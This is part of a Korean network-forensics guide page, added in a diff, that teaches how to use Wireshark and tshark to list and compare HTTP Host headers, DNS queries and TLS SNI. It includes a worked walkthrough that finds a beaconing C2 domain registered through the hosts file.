+tshark -r capture.pcapng -Y &#39;dns.flags.response == 0&#39; \
+  -T fields -e dns.qry.name | tr &#39;A-Z&#39; &#39;a-z&#39; | sort -u
+
+# 4) Host 와 목적지 IP 짝 — 불일치 탐지
+tshark -r capture.pcapng -Y &#39;http.request&#39; -T fields -e http.host -e ip.dst | sort -u
+
+# 5) DNS 응답의 이름↔IP 짝 — 4)와 맞대면 스푸핑이 보인다
+tshark -r capture.pcapng -Y &#39;dns.flags.response == 1 &amp;&amp; dns.a&#39; \
+  -T fields -e dns.qry.name -e dns.a | sort -u
+
+# 6) 파서를 우회한 Host 헤더 원문
+strings -n 8 capture.pcapng | grep -i &#39;^Host: &#39; | sort -u
+
+# 7) GUI 대조
+#    Statistics &gt; HTTP &gt; Requests   (호스트별 URI 트리)
+#    Statistics &gt; Endpoints &gt; IPv4  (실제 통신 상대 IP)</code></pre></div>
+<p>6)이 1)보다 많으면 HTTP로 파싱되지 않은 요청이 있다(비표준 포트·잘린 캡처). 4)와 5)를 맞대어 이름↔IP가 어긋나면 hosts 조작이나 DNS 스푸핑이다.</p>
+<h2 id="mini-walkthrough">mini walkthrough</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">문제:
+&quot;감염 PC 가 명령을 받아온 C2 서버의 도메인을 구하세요.&quot;
+첨부: infected.pcapng (23,410 packets, 18 MB)
+
+1. 첫 시도 (실패):
+   &quot;C2 도메인이니 DNS 질의에 있을 것&quot;이라고 보고
+   필터: dns.flags.response == 0
+
+   tshark -r infected.pcapng -Y &#39;dns.flags.response == 0&#39; \
+     -T fields -e dns.qry.name | sort -u
+
+   shop.example.com
+   cdn.example.com
+   www.google-analytics.com
+   ocsp.digicert.com
+   update.microsoft.com
+
+   -&gt; 5개 전부 정상 도메인. C2 로 보이는 것이 없다.
+      여기서 &quot;도메인이 아니라 IP 하드코딩이겠다&quot;고 단정하고
+      ip.dst 목록만 뒤진 것이 시간 낭비였다.
+
+2. 관점 변경 — DNS 가 아니라 실제로 보낸 Host 를 본다
+   tshark -r infected.pcapng -Y &#39;http.request&#39; -T fields -e http.host |
+     sort | uniq -c | sort -nr
+
+      412 shop.example.com
+       97 cdn.example.com
+       31 www.google-analytics.com
+      288 cdn-static-7f2a.top       &lt;-- DNS 질의 목록에 없다
+        2 10.0.0.250
+
+   -&gt; cdn-static-7f2a.top 이 288회. 트래픽은 많은데 DNS 질의는 0건.
+
+3. 차집합으로 확정
+   { tshark -r infected.pcapng -Y &#39;http.request&#39; -T fields -e http.host
+     tshark -r infected.pcapng -Y &#39;tls.handshake.extensions_server_name&#39; \
+       -T fields -e tls.handshake.extensions_server_name
+   } | tr &#39;A-Z&#39; &#39;a-z&#39; | sed &#39;s/:[0-9]*$//&#39; | grep . | sort -u &gt; names.txt
+   tshark -r infected.pcapng -Y &#39;dns.flags.response == 0&#39; \
+     -T fields -e dns.qry.name | tr &#39;A-Z&#39; &#39;a-z&#39; | grep . | sort -u &gt; dns.txt
+   comm -23 names.txt dns.txt
+
+   10.0.0.250
+   cdn-static-7f2a.top
+
+   -&gt; 질의 없이 접속한 이름 두 개.
+
+4. 왜 질의가 없었나 — Host 와 IP 를 맞대 본다
+   tshark -r infected.pcapng -Y &#39;http.host contains &quot;7f2a&quot;&#39; \
+     -T fields -e frame.number -e http.host -e ip.dst -e tcp.dstport | sort -u | head -3
+
+   3102  cdn-static-7f2a.top  45.155.204.11  80
+
+   외부 IP 이고, DNS 질의가 없으므로 hosts 파일 등록 또는 사전 캐시.
+   디스크 이미지가 함께 주어졌다면:
+     Get-Content &#39;C:\Windows\System32\drivers\etc\hosts&#39;
+     45.155.204.11   cdn-static-7f2a.top
+   -&gt; hosts 파일 조작 확인.
+
+5. C2 답게 행동하는지 검증 — 비컨 주기
+   tshark -r infected.pcapng -Y &#39;http.host contains &quot;7f2a&quot; &amp;&amp; http.request&#39; \
+     -T fields -e frame.time_epoch -e http.request.uri |
+     awk -F&#39;\t&#39; &#39;NR&gt;1{printf &quot;%.1f\t%s\n&quot;, $1-p, $2} {p=$1}&#39; | head -6
+
+   60.0   /api/task?id=WKS07
+   60.1   /api/task?id=WKS07
+   59.9   /api/task?id=WKS07
+   60.0   /api/task?id=WKS07
+
+   -&gt; 정확히 60초 주기의 동일 요청. 사람의 브라우징이 아니다. 비컨 확정.
+
+6. 브라우저 History 대조 (디스크 이미지 동반 시)
+   Chrome History 의 urls 테이블에 cdn-static-7f2a.top 이 없다.
+   -&gt; 브라우저가 아닌 프로세스의 접속.  (FOR-0191)
+
+7. 시각 확정
+   date -u -d @1773472561 &#39;+%Y-%m-%d %H:%M:%S UTC&#39;
+   2026-03-14 07:16:01 UTC   = 16:16:01 KST
+
+정답: cdn-static-7f2a.top  (45.155.204.11, hosts 파일 등록, 60초 비컨)</code></pre></div>
+<p>1단계의 실패가 핵심이다. <strong>DNS 질의 목록은 &quot;접속한 도메인 목록&quot;이 아니다.</strong> hosts 파일·캐시·하드코딩 때문에 항상 부분집합이거나 어긋난다. 접속한 이름의 진짜 출처는 <code>http.host</code>와 TLS SNI이고, <strong>DNS와의 차집합이 곧 은닉 신호</strong>다.</p>
+<h2 id="막혔을-때-다음-체크">막혔을 때 다음 체크</h2>
+<ol><li><code>http.host</code> 빈도표를 뽑았는가 — 그리고 <strong>하위 1~3회 항목</strong>을 봤는가</li><li>TLS SNI(<code>tls.handshake.extensions_server_name</code>) 목록을 합쳤는가 — HTTPS를 빼면 반쪽이다</li><li><code>Statistics &gt; HTTP &gt; Requests</code> 로 호스트별 URI 트리를 봤는가</li><li>Host 목록과 DNS 질의 목록의 <strong>차집합</strong>을 냈는가</li><li>Host가 IP인 요청(<code>matches &quot;^[0-9.]+&quot;</code>)을 확인했는가</li><li><code>http.request &amp;&amp; !http.host</code> 를 확인했는가</li><li>Host와 <code>ip.dst</code> 를 나란히 놓고 <strong>불일치</strong>를 찾았는가</li><li>오타 도메인·Punycode(<code>xn--</code>)·저가 TLD를 눈으로 훑었는가</li><li>Host를 <strong>소문자로 정규화하고 포트를 잘라내고</strong> 비교했는가</li><li>의심 Host의 요청 주기가 기계적으로 일정한가 — 비컨 판정</li><li>SNI 없는 TLS 연결(<code>tls.handshake.type == 1 &amp;&amp; !tls.handshake.extensions_server_name</code>)이 있는가</li><li>디스크가 있다면 <code>hosts</code> 파일과 DNS 캐시를 확인했는가</li><li>브라우저 History와 대조했는가 (<a href="./chrome-history.html">FOR-0191</a>)</li><li>시간을 UTC 절대시각으로 바꿨는가 (KST = UTC+9)</li></ol>
+<h2 id="출처">출처</h2>
+<ul><li>SRC-002 — Wireshark Display Filter Reference: <code>http.host</code>, <code>http.request.full_uri</code>, <code>tls.handshake.extensions_server_name</code>, <code>dns.qry.name</code>, <code>dns.a</code>, <code>dns.cname</code> 필드 정의와 문자열 비교 연산자 동작</li><li>SRC-064 — RFC 9110 HTTP Semantics: <code>Host</code> 헤더의 필수성과 의미, 가상 호스트 구분에서의 역할, request-target과 <code>Host</code>의 관계</li><li><code>Statistics &gt; HTTP &gt; Requests</code> 메뉴 위치와 창 구성은 Wireshark 버전에 따라 다를 수 있으므로 실제 화면에서 확인할 것</li><li>TLS 1.3에서 인증서가 암호화되어 Subject CN/SAN을 볼 수 없다는 점, 세션 재개 시 SNI가 없을 수 있다는 점은 캡처마다 다르다. SNI가 비어 있을 때 인증서 필드를 대안으로 쓸 수 있는지는 실제 캡처에서 확인할 것</li><li>저가 TLD(<code>.tk</code> <code>.top</code> <code>.xyz</code> 등) 목록은 시대에 따라 바뀐다. 목록 자체가 아니라 &quot;정상 트래픽에서 보기 드문 TLD&quot;라는 판정 기준으로 쓸 것</li></ul>
+      </div>
+      <section class="related">
+  <h2>관련 글</h2>
+  <div class="related-grid">
+  <a class="related-item" href="./http-request-basics.html">
+    <span class="rel-id">FOR-0156 · Network/PCAP</span>
+    Wireshark HTTP 필터 필드 레퍼런스: http.request부터 http.request_in까지
+  </a>
+  <a class="related-item" href="./http-request-uri-filter.html">
+    <span class="rel-id">FOR-0159 · Network/PCAP</span>
+    http.request.uri 필터 실전: == / contains / matches 와 퍼센트 인코딩 함정
+  </a>
+  <a class="related-item" href="./http-get-find.html">
+    <span class="rel-id">FOR-0157 · Network/PCAP</span>
+    pcap에서 HTTP GET 요청 분석: 쿼리 명령·다운로드 파일·User-Agent 도구 식별
+  </a>
+  <a class="related-item" href="./wireshark-30sec-triage.html">
+    <span class="rel-id">FOR-0146 · Network/PCAP</span>
+    Wireshark 30초 트리아지: pcap을 받고 처음 할 다섯 가지
+  </a>
+  </div>
+</section>
+      <div class="pager">
+<a class="related-item" href="./http-request-uri-filter.html"><span class="rel-id">← FOR-0159</span>http.request.uri 필터 실전: == / contains / matches 와 퍼센트 인코딩 함정</a>
+<a class="related-item" href="./http-status-analysis.html"><span class="rel-id">FOR-0161 →</span>HTTP 상태 코드로 성공·실패 판정: http.response.code와 401→200 전환 읽기</a>
+      </div>
+    </article>
+<aside class="toc">
+  <div class="toc-title">목차</div>
+  <ul>
+<li class="toc-l2"><a href="#한-줄-결론">한 줄 결론</a></li>
+<li class="toc-l2"><a href="#어떤-문제에서-필요한가">어떤 문제에서 필요한가</a></li>
+<li class="toc-l2"><a href="#문제에서-처음-볼-단서">문제에서 처음 볼 단서</a></li>
+<li class="toc-l2"><a href="#30초-절차">30초 절차</a></li>
+<li class="toc-l2"><a href="#상세-절차">상세 절차</a></li>
+<li class="toc-l3"><a href="#1단계-host-헤더가-무엇을-결정하는가">1단계 — Host 헤더가 무엇을 결정하는가</a></li>
+<li class="toc-l3"><a href="#2단계-접속-도메인-전체-목록을-빈도순으로">2단계 — 접속 도메인 전체 목록을 빈도순으로</a></li>
+<li class="toc-l3"><a href="#3단계-host가-ip인-요청-도메인-없이-직접-접속">3단계 — Host가 IP인 요청: 도메인 없이 직접 접속</a></li>
+<li class="toc-l3"><a href="#4단계-비정상-host-판정-기준">4단계 — 비정상 Host 판정 기준</a></li>
+<li class="toc-l3"><a href="#5단계-dns-질의-없이-나타난-host">5단계 — DNS 질의 없이 나타난 Host</a></li>
+<li class="toc-l3"><a href="#6단계-tls-sni와-합쳐-httphttps를-한-목록으로">6단계 — TLS SNI와 합쳐 HTTP/HTTPS를 한 목록으로</a></li>
+<li class="toc-l3"><a href="#7단계-브라우저-history와-대조">7단계 — 브라우저 History와 대조</a></li>
+<li class="toc-l2"><a href="#출력-필드-해석">출력 필드 해석</a></li>
+<li class="toc-l2"><a href="#pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</a></li>
+<li class="toc-l2"><a href="#흔한-함정">흔한 함정</a></li>
+<li class="toc-l2"><a href="#교차검증">교차검증</a></li>
+<li class="toc-l2"><a href="#mini-walkthrough">mini walkthrough</a></li>
+<li class="toc-l2"><a href="#막혔을-때-다음-체크">막혔을 때 다음 체크</a></li>
+<li class="toc-l2"><a href="#출처">출처</a></li>
+  </ul>
+</aside>
+  </div>
+</main>
+<footer class="site-footer">
+  완전 오프라인 · 인터넷/CDN 없음 · build 2026-09-10 08:40 KST
+</footer>
+<script src="../assets/search-index.js"></script>
+<script src="../assets/search-core.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
